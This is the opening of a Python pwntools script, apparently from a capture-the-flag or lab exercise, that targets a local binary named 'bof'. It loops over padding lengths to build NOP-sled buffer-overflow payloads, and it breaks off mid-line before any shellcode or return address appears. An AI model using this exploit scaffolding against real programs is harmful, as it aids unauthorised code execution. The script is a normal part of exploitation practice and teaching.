from pwn import *

context.log_level = "DEBUG"
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

p = process("./bof")
e = ELF("./bof")

for i in range(40,100):
    p = process("./bof")
    payload = "\x90"*i + 